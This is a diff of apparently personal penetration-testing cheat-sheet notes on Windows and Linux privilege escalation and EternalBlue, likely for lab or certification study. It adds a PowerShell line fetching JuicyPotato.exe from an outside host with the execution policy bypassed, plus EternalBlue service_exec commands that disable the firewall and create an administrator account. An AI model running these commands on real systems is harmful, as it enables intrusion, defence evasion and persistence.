@@ -22,10 +22,12 @@
 
 
 ## Windows PE
-> - Check juice potato work or not with command "Whoami /priv". If SeImpersonatePrivilege is enabled yes . you can exploit that 
-follow this step 
+### juice potato
+> - Check juice potato work or not with command "Whoami /priv". If SeImpersonatePrivilege is enabled yes . you can exploit that.
 > - powershell "IEX(New-Object Net.WebClient).downloadFile('http://192.168.119.161:8000/JuicyPotato.exe','C:\test\JuicyPotato.exe')" -bypass executionpolicy
 > - Create this script to show clsid :
+> - ![image](https://user-images.githubusercontent.com/26652599/139693143-5dd4ae2c-c5b3-4bc7-80df-c84236e5b88a.png)
+
 > $ New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
 > $ $CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object
 > $ {$_.appid -ne $null}
@@ -33,5 +35,43 @@ follow this step
 > $ {
 > $    Write-Host $a.CLSID
 > $ }
+> - or follow it https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82 , https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+
+### Windows XP SP0/SP1 Privilege Escalation to System
+> - https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+> - check permission of all services 'accesschk.exe /accepteula -uwcqv "Authenticated Users" *'
+> - Then check service running on higher privilege or not with command : Sc qc <service_name> 
+> - https://payatu.com/blog/suraj/Windows-Privilege-Escalation-Guide
+> - https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+
+## Linux PE
+> - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+> - https://gtfobins.github.io/#+sudo%20
+> - https://atom.hackstreetboys.ph/linux-privilege-escalation-cron-jobs/
+> - https://tryhackme.com/room/linuxprivesc
+### LIST KERNEL EXPLOTATION 
+> - https://github.com/anoaghost/Localroot_Compile/blob/master/README.md
+### DOCKER PRIVILLAGE ESCALATION 
+> - https://www.hackingarticles.in/docker-privilege-escalation/
+> - ![image](https://user-images.githubusercontent.com/26652599/139695751-27ed4014-908e-4807-a3a4-9406a75981ef.png)
+### UPGRADING SHELL
+> - https://refabr1k.gitbook.io/oscp/privesc-linux/upgrading-shells
+
+
+## EternalBlue
+> - If smb has AV (anti virus or firewall active disable AV with this code : service_exec(conn, r'cmd /c netsh firewall set opmode disable') 
+> - And if rdp active add user and add user to group administrator using this command :service_exec(conn, r'cmd /c net user bill pass /add')
+service_exec(conn, r'cmd /c net localgroup administrators bill /add')
+
+> - https://redteamzone.com/EternalBlue/ 
+> - https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+> - https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
+> - https://root4loot.com/post/eternalblue_manual_exploit/
+> - https://www.cybersecpadawan.com/2020/05/tryhackme-blue-eternalblue-exploitation.html
+
+
+
+
+
 
 
